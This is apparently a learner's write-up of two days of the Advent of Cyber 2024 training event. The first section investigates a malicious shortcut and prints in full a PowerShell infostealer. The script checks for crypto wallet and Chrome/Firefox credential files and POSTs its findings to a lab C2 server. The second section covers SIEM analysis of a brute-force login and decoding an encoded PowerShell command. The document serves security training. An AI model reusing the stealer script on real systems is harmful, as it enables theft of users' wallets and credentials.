# Advent Of Cyber 2024 🎄
Just a collection of what we did and learn on each day throughout the event.

## Day 01 (OPSEC)
So it basicly was about exploring a wesite which downloading a extra file with each download, when we use 'file' command we found it is a MS Windows Shortcut and then later to look at the meta-data this file was holding we used "Exiftool" to read it. We found it was running few powershell command which was disabling the restrictions and downloading the file from `"https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1"` and storing it in the `"C:\\ProgramData\\"` and then executing the script.

the script was :
```
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```

The link of the script which is `"https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1"` so in here `MM-WarevilleTHM` is the github username of the person from which the script is downloading, now we know it's him but if we like to gather some more proof then, we look out for some unique part of the script `"Created by the one and only M.M"` and then try to search it on the github, which lead us to this issue:
`https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1` where user `MM-WarevilleTHM` was trying to ask questions about creating this script. 

when we go to his profile's username repository this is what we found:
```
- 🦹‍♂️ Hi, I’m M.M, also known as Mayor Malware. I run things in Wareville Town.
- 👀 This year, SOC-mas is not going to happen and I will do all I can to sabotage it.
- 🌱 I'll develop all necessary tools and plans to sabotage the event and frustrate the citizens of Wareville. One thing is to find someone to blame for all this. Maybe Glitch will take the blame.
- 📫 How to reach me? Find me around Wareville.
```

In Short:
We caught him. ✨😁

## Day 2 (Log Analysis)
Now we have to check the logs to identify whether it's False Positive or True Positive. 

For this first we login to the Elastic SIEM (Security Information and Event Management) and then we have to check some activity between Dec 1 2024 0900 to 0930 then we found that someone run some Powershell commands on each machine, the usename was `"service_admin"` which was very generic which make it more suspicious.
Then we have to look into the ip address of source which is available for the authentication events, Now we have to look for auth events just before the execution of those Powershell commands.

To get better understanding of the events we expand our search from Nov 29 0000 to Dec 01 2330, where we saw the spike in activity of by user `"service_admin"` to exactly look for the spike we filter out one of the ip address `10.0.11.11` so see for other ip address which we got `10.0.255.1` that got so many failed login attempts which means it was a brute force attack because if this was because of a outdated script then it would not stop even after the sucess of auth but this one stopped after the sucessful login attempt. Now what we have to check is the Process activity it did just after login, which lead use to some similar command being executed which was:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

here is a encoded command:
`SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==`

so we goto cyberchef and try to decode it, so generally powershell command usually use Base54 UTF-16LE encoding and we it decoded into the text use use the recipe `From Base64` and `Decode Text` which reveal the real command `Install-WindowsUpdate -AcceptAll -AutoReboot`.
So someone was trying to help the McSkidy and the team secure their defences and no malicious activity happend. 😄 
